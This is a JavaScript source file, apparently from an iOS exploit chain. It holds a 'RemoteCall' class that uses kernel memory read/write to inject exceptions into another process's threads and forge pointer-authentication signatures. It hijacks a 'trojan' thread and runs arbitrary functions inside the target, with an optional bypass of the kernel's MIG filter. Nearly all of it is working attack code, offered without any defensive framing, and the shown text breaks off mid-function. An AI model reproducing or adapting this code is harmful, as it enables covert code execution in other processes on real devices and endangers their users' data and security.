import Utils from "libs/JSUtils/Utils";
import Native from "libs/Chain/Native";
import Chain from "libs/Chain/Chain";
import Task from "./Task";
import Thread from "./Thread";
import Exception from "./Exception";
import ExceptionMessageStruct from "./ExceptionMessageStruct";
import ThreadState from "./ThreadState";
import PAC from "./PAC";
import VM from "./VM";
import VMShmem from "./VMShmem";
import MachMsgHeaderStruct from "./MachMsgHeaderStruct";
import PortRightInserter from "./PortRightInserter";//import ExceptionThreadJS17 from '!raw-loader!./ExceptionThread17.js'
//import ExceptionThreadJS18 from '!raw-loader!./ExceptionThread18.js'

//import Offsets from "Driver/Offsets";

const TAG = "REMOTECALL"
const GUARD_TYPE_MACH_PORT = 0x1n;
const kGUARD_EXC_INVALID_RIGHT = BigInt(1 << 8);
const SWITCH_OPTION_NONE = 0n;
const fakePCTrojanCreator = 0x101n;
const fakeLRTrojanCreator = 0x201n;
const fakePCTrojan = 0x301n;
const fakeLRTrojan = 0x401n;
const __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK = 0xff000000n;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR = 0x2;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC = 0x4;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR = 0x8;
const SHMEM_CACHE_SIZE = 100;
const MAP_PRIVATE = 0x0002n;
const MAP_ANON = 0x1000n;

export default class RemoteCall
{
	#taskAddr;
	#creatingExtraThread;
	#firstExceptionPort;
	#secondExceptionPort;
	#firstExceptionPortAddr;
	#secondExceptionPortAddr;
	#dummyThread;
	#dummyThreadMach;
	#dummyThreadAddr;
	#dummyThreadTro;
	#selfThreadAddr;
	#selfThreadCtid;
	#trojanThreadAddr;
	#callThreadAddr;
	#originalState;
	#vmMap;
	#trojanMem;
	#localPort;
	#remotePort;
	#shmemCache = new Array(SHMEM_CACHE_SIZE);
	//#exceptionThreadCFString;
	#success = false;
	#threadList = [];
	#krwControlFd;
	#krwRwFd;
	#pid;

	constructor(param, migFilterBypass=null)
	{
		if(typeof(param) == "string")
		{
			console.log(TAG,`Getting task by name: ${param}`);
			this.#taskAddr = Task.getTaskAddrByName(param);
			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
		}
		else
		{
			console.log(TAG,`Getting task by pid: ${param}`);
			this.#taskAddr = Task.getTaskAddrByPID(param);
			this.#pid = param;
			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
		}

		if(!this.#taskAddr)
		{
			console.log(TAG,`Cannot get taskAddr, returning`);
			return null;
		}

		/*
		let threadmMem = 0n;
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
		}
		else
		{
			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
		}
		//Native.callSymbol("free", threadmMem);
		*/

		let firstExceptionPort = Exception.createPort();
		let secondExceptionPort = Exception.createPort();
	
		if (!firstExceptionPort || !secondExceptionPort)
		{
			console.log(TAG,`Couldn't create exception ports`);
			Native.callSymbol("mach_port_destruct", 0x203n, firstExceptionPort, 0n, 0n);
			Native.callSymbol("mach_port_destruct", 0x203n, secondExceptionPort, 0n, 0n);
			return null;
		}
		// Make sure the task won't crash after we handle an exception
		Task.disableExcGuardKill(this.#taskAddr);

		let guardCode = 0n;
		guardCode = this.#EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
		guardCode = this.#EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
		guardCode = this.#EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503n);
		let firstPortAddr = Task.getPortAddr(firstExceptionPort);
		let secondPortAddr = Task.getPortAddr(secondExceptionPort);
		//console.log(TAG,`Exception port 1:${Utils.hex(firstExceptionPort)} with kAddr:${Utils.hex(firstPortAddr)}`);
		//console.log(TAG,`Exception port 2:${Utils.hex(secondExceptionPort)} with kAddr:${Utils.hex(secondPortAddr)}`);

		let dummyThread = Native.mem;
		let dummyFunc = Native.dlsym("getpid");
		//console.log(TAG,`dummyFunc:${Utils.hex(dummyFunc)}`);
		
		Native.callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
		dummyThread = Native.read64(dummyThread);
		let dummyThreadMach = BigInt(Native.callSymbol("pthread_mach_thread_np",dummyThread));
		let dummyThreadAddr = Task.getPortKObject(dummyThreadMach);
		let dummyThreadTro = Thread.getTro(dummyThreadAddr);
		let threadSelf = BigInt(Native.callSymbol("mach_thread_self"));
		let selfThreadAddr = Task.getPortKObject(threadSelf);
		let selfThreadCtid = Thread.getCtid(selfThreadAddr);
	
		//console.log(TAG,`Dummy thread:${Utils.hex(dummyThreadMach)}`);
		//console.log(TAG,`Dummy thread object:${Utils.hex(dummyThreadAddr)}`);
		//console.log(TAG,`Dummy thread tro:${Utils.hex(dummyThreadTro)}`);
	
		//console.log(TAG,`Self thread:${Utils.hex(threadSelf)}`);
		//console.log(TAG,`Self thread object:${Utils.hex(selfThreadAddr)}`);
		//console.log(TAG,`Guard exc code:${Utils.hex(guardCode)}`);
		//console.log(TAG,`Self thread ctid:${Utils.hex(selfThreadCtid)}`);
		
		this.#creatingExtraThread = true;
		this.#firstExceptionPort = firstExceptionPort;
		this.#secondExceptionPort = secondExceptionPort;
		this.#firstExceptionPortAddr = firstPortAddr;
		this.#secondExceptionPortAddr = secondPortAddr;
		this.#dummyThread = dummyThread;
		this.#dummyThreadMach = dummyThreadMach;
		this.#dummyThreadAddr = dummyThreadAddr;
		this.#dummyThreadTro = dummyThreadTro;
		this.#selfThreadAddr = selfThreadAddr;
		this.#selfThreadCtid = selfThreadCtid;
		let retryCount = 0;
		let validThreadCount = 0;
		let successThreadCount = 0;
		let firstThread = Task.firstThread(this.#taskAddr);
		let currThread = firstThread;
	
		this.#trojanThreadAddr = firstThread;

		if (migFilterBypass)
			migFilterBypass.resume();
		
		while (true && successThreadCount < 2 && validThreadCount < 5 && retryCount < 3)
		{
			let task = Thread.getTask(currThread);
			if (!task)
			{
				if (!validThreadCount)
				{
					console.log(TAG, `failed on getting first thread at all, resetting first thread and currThread`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else
					break;
			}
			//console.log(TAG,`Trying Inject EXC_GUARD on thread:${Utils.hex(currThread)} with tro task:${Utils.hex(task)}`);
			if (task == this.#taskAddr)
			{
				if (!this.#setExceptionPortOnThread(this.#firstExceptionPort, currThread, migFilterBypass))
				{
					console.log(TAG, `Set exception port on thread:${Utils.hex(currThread)} failed, not injecting`);
					if (!validThreadCount)
					{
						console.log(TAG, `failed on first thread, resetting first thread and currThread`);
						firstThread = currThread = this.#retryFirstThread(migFilterBypass);
						retryCount++;
						continue;
					}
				}
				else
				{
					// Inject a EXC_GUARD exception on this thread
					if (!Thread.injectGuardException(currThread, guardCode))
					{
						console.log(TAG,`Inject EXC_GUARD on thread:${Utils.hex(currThread)} failed, not injecting`);
						if (!validThreadCount)
						{
							console.log(TAG, `failed on first thread, resetting first thread and currThread`);
							firstThread = currThread = this.#retryFirstThread(migFilterBypass);
							retryCount++;
							continue;
						}
					}
					else
					{
						successThreadCount++;
						this.#threadList.push(currThread);
						console.log(TAG, `Inject EXC_GUARD on thread:${Utils.hex(currThread)} OK`);
					}
				}
				validThreadCount++;
			}
			else if (task && !validThreadCount)
			{
				console.log(TAG,`Got weird tro on first thread, resetting first thread and currThread`);
				firstThread = currThread = this.#retryFirstThread(migFilterBypass);
				retryCount++;
				continue;
			}

			let next = Thread.next(currThread);
			if (!next)
			{
				if (!validThreadCount) {
					console.log(TAG, `Got empty next thread on first thread. Retry`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else {
					console.log(TAG, "Break because of empty next thread");
					break;
				}
			}
			currThread = next;
		}

		if (migFilterBypass)
			migFilterBypass.pause();

		console.log(TAG, `Valid threads: ${validThreadCount}`);
		console.log(TAG, `Injected threads: ${successThreadCount}`);

		if (!this.#threadList.length) {
			console.log(TAG, "Exception injection failed. Aborting.");
			this.destroy();
			return null;
		}

		let excBuffer = Native.mem;
		// Since we are in background, we don't mind to wait a lot!
		if(!Exception.waitException(this.#firstExceptionPort,excBuffer,120000,false))
		{
			console.log(TAG, `Failed to receive first exception`);
			this.destroy();
			return null;
		}

		//console.log(TAG,`Got first exception succesfully`);
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		// Save state to restore its execution after trojan thread creation TODO make it inside ThreadState to copy thread state to another variable
		let originalStateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		this.#originalState = new ThreadState(originalStateBuff);
		for(let i = 0; i < 29; i++)
		{
			this.#originalState.registers.set(i,exc.threadState.registers.get(i));
		}
		this.#originalState.opaque_fp = exc.threadState.opaque_fp;
		this.#originalState.opaque_lr = exc.threadState.opaque_lr;
		this.#originalState.opaque_sp = exc.threadState.opaque_sp;
		this.#originalState.opaque_pc = exc.threadState.opaque_pc;
		this.#originalState.cspr = exc.threadState.cspr;
		this.#originalState.opaque_flags = exc.threadState.opaque_flags;
	
		//console.log(TAG,`Clear EXC_GUARD from all other threads...`);

		for(let i = 0; i < this.#threadList.length;i++)
		{
			Thread.clearGuardException(this.#threadList[i]);
			//console.log(TAG,`Clear EXC_GUARD on thread:${Utils.hex(this.#threadList[i])} OK`);
		}
		console.log(TAG,`Finish clearing EXC_GUARD from all other threads...`);
		let desiredTimeout = 1500;
		// Flush exceptions in other threads (is that really needed?)
		while (true)
		{
			let excBuffer = Native.mem;
			if (!Exception.waitException(this.#firstExceptionPort, excBuffer, desiredTimeout, false))
				break;
			let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
			let exc = new ExceptionMessageStruct(excRes);
			//threadClearGuardException(remoteCall->trojanThreadAddr);
			Exception.replyWithState(exc, exc.threadState,false);
		}
		//console.log(TAG,`finished flushing exceptions`);
		let newState = exc.threadState;
		//console.log(TAG,`gadget_pacia:${Utils.hex(PAC.gadget_pacia)}`);
		newState = this.#signState(firstThread, newState, fakePCTrojanCreator, fakeLRTrojanCreator);
		//console.log(TAG,`updated PC:${Utils.hex(newState.opaque_pc)} and LR:${Utils.hex(newState.opaque_lr)}`);
		Exception.replyWithState(exc, newState, false);
		//console.log(TAG,`Trojan thread created`);
		
		//console.log(TAG,`Test remote getpid()`);
		//let pidRemote = this.#doRemoteCallTemp(100, "getpid");
		//console.log(TAG,`pidRemote:${pidRemote}`);
		
		// Use stack as a temporary remote memory
		let trojanMemTemp = exc.threadState.opaque_sp & 0x7fffffffffn;
		//console.log(TAG,`Remote memory:${Utils.hex(trojanMemTemp)}`);
		
		// Substracting a bit from stack pointer to not corrupt original stack
		trojanMemTemp = trojanMemTemp - 0x100n;

		this.#vmMap = Task.getMap(this.#taskAddr);
		//console.log(TAG,`vmMap:${Utils.hex(this.#vmMap)}`);

		// Create a remote pthread that should always crash on first execution, so we can control it with exceptions.
		let remoteCrashSigned = PAC.remotePAC(this.#trojanThreadAddr, fakePCTrojan, 0n);
		//console.log(TAG,`remoteCrashSigned:${Utils.hex(remoteCrashSigned)}`);

		let ret = this.#doRemoteCallTemp(100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
		//console.log(TAG,`pthread_create_suspended_np:${Utils.hex(ret)}`);
		//VM.mocker(0x221d54,0xffffffdc08875500n);
		
		let pthreadAddr = this.read64(BigInt(trojanMemTemp));
		//console.log(TAG,`pthreadAddr:${Utils.hex(pthreadAddr)}`);
		
		// Get mach port of the new thread and set exception port on it.
		let callThreadPort = this.#doRemoteCallTemp(100, "pthread_mach_thread_np", pthreadAddr);
		//console.log(TAG,`Call thread port:${Utils.hex(callThreadPort)}`);

		if (callThreadPort == 0n)
		{
			console.log(TAG,`Cannot find callThreadPort`);
			this.destroy();
			return null;
		}
		this.#callThreadAddr = Task.getPortKObjectOfTask(this.#taskAddr, BigInt(callThreadPort));
		//console.log(TAG,`Call thread addr:${Utils.hex(this.#callThreadAddr)}`);
		// Note that this exception port is not the same of the initial exception port we use for existing threads.

		if (migFilterBypass)
			migFilterBypass.resume();

		if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
		{
			console.log(TAG,`Failed to set new exception port on newly created thread, trying one more time before giving up, creating new thread`);
			dummyThread = Native.mem;	
			Native.callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
			dummyThread = Native.read64(dummyThread);
			this.#dummyThreadMach = BigInt(Native.callSymbol("pthread_mach_thread_np",dummyThread));
			this.#dummyThreadAddr = Task.getPortKObject(this.#dummyThreadMach);
			this.#dummyThreadTro = Thread.getTro(this.#dummyThreadAddr);
			Native.callSymbol("sleep",1n);
			if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
			{
				if (migFilterBypass)
					migFilterBypass.pause();
				this.destroy();
				return null;
			}
		}

		if (migFilterBypass)
			migFilterBypass.pause();
		
		console.log(TAG,`All good so far! Now we resume trojan thread...`);

		// Ok, now we are ready to start this thread and catch exceptions on it.
		ret = this.#doRemoteCallTemp(100, "thread_resume", callThreadPort);
		//console.log(TAG,`thread_resume():${ret}`);
		if (ret !== 0n)
		{
			console.log(TAG,`Couldn't resume newly created thread, falling back to use original one only`);
			this.#creatingExtraThread = false;
		}

		if (this.#creatingExtraThread)
		{
			console.log(TAG,`New thread created succesfully, resuming original`);
			this.#restoreTrojanThread(this.#originalState);
		}
		console.log(TAG, `Original thread restored succesfully`);

		// From this point on, the "stable" trojan thread is ready to process calls.
		//console.log(TAG, `Original thread restored succesfully, testing getpid on stable primitive`);
		this.#pid = this.#doRemoteCallStable(100, "getpid");
		console.log(TAG, `Task pid: ${this.#pid}`);
		
		//this.#trojanMem = trojanMemTemp;
		//this.#testRWPrim();

		// Allocate a general purpose remote page mem.
		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, Utils.PAGE_SIZE, VM.VM_PROT_READ | VM.VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
		//console.log(TAG,`Newly mapped memory:${Utils.hex(this.#trojanMem)}`);
		
		// Memory must be written at least once (COW) to be found in vmMap.
		this.#doRemoteCallStable(100,"memset",this.#trojanMem, 0n, Utils.PAGE_SIZE);

		this.#success = true;

		console.log(TAG,`Finished for now succesfully`);
	}

	success() {
		return this.#success;
	}

	krwCtx() {
		return {
			controlFd: this.#krwControlFd,
			rwFd: this.#krwRwFd
		};
	}

	pid() {
		return this.#pid;
	}

	#testRWPrim()
	{
		console.log(TAG,`Testing RW prim`);
		let arr = new ArrayBuffer(Utils.UINT64_SIZE);
		let arrView = new DataView(arr);
		arrView.setBigUint64(0,0x41414141n,true);
		let memBuff = Native.mem;
		Native.write(memBuff,arr);
		this.write(BigInt(this.#trojanMem),memBuff,BigInt(Utils.UINT64_SIZE));
		memBuff = Native.mem + 0x100n;
		this.read(BigInt(this.#trojanMem),memBuff,BigInt(Utils.UINT64_SIZE));
		let resBuff = Native.read(memBuff,Utils.UINT64_SIZE);
		let resView = new DataView(resBuff);
		let result = resView.getBigUint64(0,true);
		console.log(TAG,`Got result from Buffer of:${Utils.hex(result)}`);
	}

	#retryFirstThread(migFilterBypass) {
		if (migFilterBypass)
			migFilterBypass.pause();
		Native.callSymbol("sleep", 1n);
		if (migFilterBypass)
			migFilterBypass.resume();
		return Task.firstThread(this.#taskAddr);
	}

	#signState(SigningThread,state,pc,lr)
	{
		//console.log(TAG,`state.opaque_flags:${Utils.hex(state.opaque_flags)}`);
		let diver = BigInt(state.opaque_flags) & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
		//console.log(TAG,`diver after:${Utils.hex(diver)}`);
		let discPC = Utils.ptrauth_blend_discriminator(BigInt(diver), Utils.ptrauth_string_discriminator_special("pc"));
		let discLR = Utils.ptrauth_blend_discriminator(BigInt(diver), Utils.ptrauth_string_discriminator_special("lr"));
		//console.log(TAG,`discPC:${Utils.hex(discPC)}`);
		//console.log(TAG,`discLR:${Utils.hex(discLR)}`);
		/* C wrapper for ptrauth utils
		discPC = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver),Utils.ptrauth_string_discriminator("pc"));
		discLR = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver), Utils.ptrauth_string_discriminator("lr"));
		console.log(TAG,`discPC after:${Utils.hex(discPC)}`);
		console.log(TAG,`discLR after:${Utils.hex(discLR)}`);
		*/
		if (pc)
		{
			state.opaque_flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
			state.opaque_pc = PAC.remotePAC(SigningThread, pc, discPC);
		}
		if (lr)
		{
			state.opaque_flags &= ~(
				__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
				__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
			state.opaque_lr = PAC.remotePAC(SigningThread, lr, discLR);
		}
		return state;
	}
	
	#setExceptionPortOnThread(exceptionPort, currThread, migFilterBypass=null)
	{
		let success = false;
		
		let thread_set_exception_ports_addr = Native.dlsym("thread_set_exception_ports");
		let pthread_exit_addr = Native.dlsym("pthread_exit");

		//console.log(TAG, "pc:          " + Utils.hex(thread_set_exception_ports_addr));
		//console.log(TAG, "pc signed:   " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"))));
		//console.log(TAG, "pc signed 0: " + Utils.hex(Native.pacia(thread_set_exception_ports_addr, 0)));

		//let stackMem = Native.callSymbol("malloc", 0x8000);
		//let thread_set_exception_ports_addr = Native.dlsym("_exit");
		//let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		//let state = new ThreadState(stateBuff);

		//let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);
		
		let pthreadPtr = Native.mem;
		Native.callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
		let pthread = Native.read64(pthreadPtr);
		//console.log(TAG, "pthread: " + Utils.hex(pthread));

		let machThread = BigInt(Native.callSymbol("pthread_mach_thread_np", pthread));
		let machThreadAddr = Task.getPortKObject(machThread);
		//console.log(TAG, `machThread:${Utils.hex(machThread)} machThreadAddr:${Utils.hex(machThreadAddr)}`);

		if (migFilterBypass)
			migFilterBypass.monitorThreads(this.#selfThreadAddr, machThreadAddr);

		let state = Thread.getState(machThread);
		if (!state) {
			console.log(TAG, "Unable to read thread state");
			return false;
		}

		//console.log(TAG, "thread_get_state OK");

		state.opaque_pc = Native.pacia(thread_set_exception_ports_addr, Utils.ptrauth_string_discriminator("pc"));
		state.opaque_lr = Native.pacia(pthread_exit_addr, Utils.ptrauth_string_discriminator("lr"));
		//state.opaque_sp = stackMem + 0x4000n;
		state.registers.set(0, this.#dummyThreadMach);
		state.registers.set(1, Utils.EXC_MASK_GUARD | Utils.EXC_MASK_BAD_ACCESS);
		state.registers.set(2, exceptionPort);
		state.registers.set(3, Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES);
		state.registers.set(4, Utils.ARM_THREAD_STATE64);

		//console.log(TAG, "pc: " + Utils.hex(state.opaque_pc));
		//console.log(TAG, "lr: " + Utils.hex(state.opaque_lr));
		//console.log(TAG, "sp: " + Utils.hex(state.opaque_sp));
		//console.log(TAG, "x0: " + Utils.hex(state.registers.get(0)));
		//console.log(TAG, "x1: " + Utils.hex(state.registers.get(1)));
		//console.log(TAG, "x2: " + Utils.hex(state.registers.get(2)));
		//console.log(TAG, "x3: " + Utils.hex(state.registers.get(3)));
		//console.log(TAG, "x4: " + Utils.hex(state.registers.get(4)));

		if (migFilterBypass)
			Native.callSymbol("usleep", 100000);
	
		if (!Thread.setState(machThread, machThreadAddr, state))
			return false;

		//console.log(TAG, "Thread.setState() OK");

		if (migFilterBypass)
			Native.callSymbol("usleep", 100000);

		Thread.setMutex(this.#dummyThreadAddr, this.#selfThreadCtid);
		
		if (!Thread.resume(machThread))
			return false;

		//console.log(TAG, "Thread resume OK");

		/*
		let threadmem = Native.callSymbol("malloc",0x400);
		Native.write64(threadmem + 0x100n, this.#dummyThreadMach);
		Native.write64(threadmem + 0x108n, exceptionPort);
		Native.callSymbol("usleep",100n);
		Chain.threadSpawn(this.#exceptionThreadCFString, threadmem);
		let timeout = 10000n;
		if(largeTimeout)
			timeout = 30000n;
		Native.callSymbol("usleep",timeout);
		let machThread = Native.read64(threadmem + 0x100n);
		Native.callSymbol("free",threadmem);
		let machThreadAddr = 0n;
		if(machThread == this.#dummyThreadMach)
		{
			console.log(TAG,`remote thread didn't succeed, aborting`);
			Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
			// This will wake up setter
			Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
			Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
			return false;
		}
		else
			machThreadAddr = Task.getPortKObject(machThread);
		*/

		//Native.callSymbol("usleep",100n);
		//kr = Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		//console.log(TAG, "thread_switch: " + kr);
		//if (!machThreadAddr)
		//{
		//	console.log(TAG,`Unable to get machThreadAddr`);
			//return false;
		//}
		//console.log(TAG, "Successfully switched to new mach thread");

		//Native.callSymbol("sleep", 2);
		//Native.callSymbol("usleep", 100000);

		//Native.callSymbol("sleep", 1);

		for (let i=0; i<10; i++) {
			Native.callSymbol("usleep", 200000);

			let kstack = 0x0n;
			//let retries = 0n;
			//while (true && !kstack && retries < 100000n)
			//{
			//	//Native.callSymbol("usleep",100n);
			//	kstack = Thread.getStack(machThreadAddr);
			//	retries++;
			//}
			kstack = Thread.getStack(machThreadAddr);
			if (!kstack)
			{
				console.log(TAG,`Failed to get kstack. Retry...`);
				continue;
			}
			//console.log(TAG,`kstack:${Utils.hex(kstack)}`);
			// Waiting a bit longer to make sure pointer is valid
			//Native.callSymbol("usleep",10000n);
			//console.log(TAG,`Current mutex:${Utils.hex(Thread.getMutex(this.#dummyThreadAddr))}`);
			//uwrite64(threadmem + 0x100n,0x0n); // instead of free
			let kernelSPOffset = BigInt(Utils.UINT64_SIZE * 12);
			let kernelSP = Chain.read64(kstack + kernelSPOffset);
			if (!kernelSP) {
				console.log(TAG, "Failed to get SP. Retry...");
				continue;
			}
			//console.log(TAG,`kernelSP:${Utils.hex(kernelSP)}`);
			//Native.callSymbol("usleep",20000n);
			Native.callSymbol("usleep",100n);
			//let data = Native.callSymbol("malloc",0x1000n);
			//console.log(TAG,`Before reading from page`);
			let dataBuff = Chain.readBuff(Task.trunc_page(kernelSP) + 0x3000n, 0x1000);
			if (!dataBuff) {
				console.log(TAG, "Failed to read from kernel SP. Aborting...");
				break;
			}
			//console.log(TAG,`Second read finished succesfully`);
			//Native.callSymbol("usleep",100n);
			//let dataBuff = Native.read(data,0x1000);
			//Native.callSymbol("free",data);

			//let troPointer = Native.mem;
			let buffer = new ArrayBuffer(8);
			const view = new DataView(buffer);
			view.setBigUint64(0,this.#dummyThreadTro,true);
			let found = Utils.memmem(dataBuff,buffer);
			//console.log(TAG,`found:${Utils.hex(found)}`);
			found = BigInt(found) + 0x3000n;
			let correctTro = false;
			let val = Native.mem;
			Chain.read(Task.trunc_page(kernelSP) + found + 0x18n, val, Utils.UINT64_SIZE);
			val = Native.readPtr(val);
			if(val == 0x1002)
				correctTro = true;
			else {
				console.log(TAG, "Wrong tro. Retry...");
				continue;
			}
				//console.log(TAG,`Wrong tro, skipping this thread`);
			if (found && correctTro)
			{
				//console.log(TAG,`Found TRO!`);
				if(Thread.getTask(currThread) == this.#taskAddr)
				{
					let tro = Thread.getTro(currThread);
					//console.log(TAG,`tro:${Utils.hex(tro)}`);
					Chain.write64(Task.trunc_page(kernelSP) + BigInt(found), tro);
					success = true;
					break;
				}
				else
				{
					console.log(TAG,`got empty tro, skip writing`);
				}
			}
			else
			{
				console.log(TAG, `didnt find tro for ${Utils.hex(currThread)}`);
			}
		}

		//console.log(TAG,`Injecting into:${Utils.hex(currThread)}`);
		// Set LCK_MTX_NEEDS_WAKEUP so that setter would be woken up by the turnstile of the lock on next use.
		Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP

		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		// This will wake up setter
		Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, exceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
		//Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
		//Native.callSymbol("usleep",40000n);
		//console.log(TAG,`After second thread switch`);
		//pthread_join(setExceptionThread, NULL);
		//mpd_js_thread_join(th);
		//free(data);
		//console.log(TAG,`Finish injecting into:${Utils.hex(currThread)}`);

		if (migFilterBypass)
			Native.callSymbol("usleep", 100000);

		return success;
	}

	#doRemoteCallTemp(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		let newTimeout = Utils.MAX(10000,timeout);
		//Calculate actual pc addr
		let pcAddr = Native.dlsym(name);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = Native.mem;
		if (!Exception.waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive first exception on original thread`);
			return 0;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojanCreator);
		Exception.replyWithState(exc, newState, false);
		exc.threadState.registers.set(0,x0);
	
		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			console.log(TAG,`Trojan thread cleanup`);
			return 0;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!Exception.waitException(this.#firstExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive second exception on original thread`);
			return 0;
		}
		excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		exc = new ExceptionMessageStruct(excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
		Exception.replyWithState(exc, newState, false);
	
		return retValue;
	}

	#doRemoteCallStable(
		timeout,
		name,
		x0 = 0n,
		x1 = 0n,
		x2 = 0n,
		x3 = 0n,
		x4 = 0n,
		x5 = 0n,
		x6 = 0n,
		x7 = 0n)
	{
		if (!this.#creatingExtraThread)
			return this.#doRemoteCallTemp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
			
		//Calculate actual pc addr
		let pcAddr = Native.dlsym(name);
		if (!pcAddr) {
			console.log(TAG, "Unable to find symbol: " + name);
			return 0;
		}
		let newTimeout = Utils.MAX(10000,timeout);
		// First wait for the pending exception caused by previous state corruption, so we can the reply with a new state.
		let excBuffer = Native.mem;
		if (!Exception.waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive first exception on new thread`);
			return 0;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		// Set the new state
		let newState = exc.threadState;
		newState.registers.set(0,x0);
		newState.registers.set(1,x1);
		newState.registers.set(2,x2);
		newState.registers.set(3,x3);
		newState.registers.set(4,x4);
		newState.registers.set(5,x5);
		newState.registers.set(6,x6);
		newState.registers.set(7,x7);
		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojan);
		Exception.replyWithState(exc, newState, false);
		exc.threadState.registers.set(0, x0);

		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
		if (timeout < 0)
		{
			console.log(TAG,`Trojan thread cleanup`);
			return 0;
		}
		// Wait for the exception on LR corruption, so we can get return value of the call.
		if (!Exception.waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
		{
			console.log(TAG,`Don't receive second exception on new thread`);
			return 0;
		}
		excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		exc = new ExceptionMessageStruct(excRes);
		let retValue = exc.threadState.registers.get(0);
	
		// Corrupt again PC so we can control flow for the next call.
		newState = exc.threadState;
		// Can be therotical used one previous implementation doesn't set LR
		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
